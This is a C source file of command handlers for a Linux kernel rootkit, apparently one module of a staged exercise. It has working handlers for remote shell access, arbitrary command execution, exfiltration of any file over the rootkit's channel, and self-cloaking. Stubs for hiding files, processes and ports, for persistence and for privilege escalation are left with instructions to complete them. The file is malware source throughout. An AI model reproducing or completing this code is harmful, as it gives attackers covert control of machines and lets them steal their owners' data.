// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include "rootkit.h"

/* ---- Handlers from M04 (already working) ---- */

int cmd_ping(struct rk_session *s, const char *arg)
{
	return rk_send_response(s, "PONG");
}

int cmd_status(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf),
		 "files=%d pids=%d content=%d ports=%d",
		 rk_file_targets.count, rk_pid_targets.count,
		 rk_content_targets.count, rk_port_targets.count);
	return rk_send_response(s, buf);
}

int cmd_info(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf), "%s %s %s",
		 utsname()->sysname, utsname()->release, utsname()->machine);
	return rk_send_response(s, buf);
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	rk_start_interactive();
	return rk_send_response(s, "SHELL OK");
}

int cmd_exec(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_start_exec(arg);
	return rk_send_response(s, "EXEC OK");
}

int cmd_download(struct rk_session *s, const char *arg)
{
	struct file *f;
	char *buf;
	loff_t pos = 0;
	int error = 0;

	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing path");

	f = filp_open(arg, O_RDONLY, 0);
	if (IS_ERR(f))
		return rk_send_response(s, "ERR open failed");

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(f, NULL);
		return -ENOMEM;
	}

	for (;;) {
		ssize_t bytes_read;

		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
		if (bytes_read < 0) {
			error = (int)bytes_read;
			break;
		}
		if (bytes_read == 0)
			break;

		error = rk_send_sealed(s, (u8 *)buf, bytes_read);
		if (error)
			break;
	}

	if (!error)
		error = rk_send_sealed(s, (const u8 *)"", 0);

	kfree(buf);
	filp_close(f, NULL);
	return error;
}

int cmd_cloak(struct rk_session *s, const char *arg)
{
	rk_cloak();
	return rk_send_response(s, "CLOAK OK");
}

int cmd_uncloak(struct rk_session *s, const char *arg)
{
	rk_uncloak();
	return rk_send_response(s, "UNCLOAK OK");
}

/* ---- Wire the remaining 12 commands ---- */

// HIDE/UNHIDE for each target type (files, PIDs, content, ports).
// HIDE adds a target. UNHIDE removes by index.
// Follow the pattern of the 8 handlers above.

int cmd_hide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_hide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// LIST: enumerate entries from one target list by name.
int cmd_list(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

// Persistence, escalation: delegate to opsec.c.
int cmd_persist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_escalate(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}
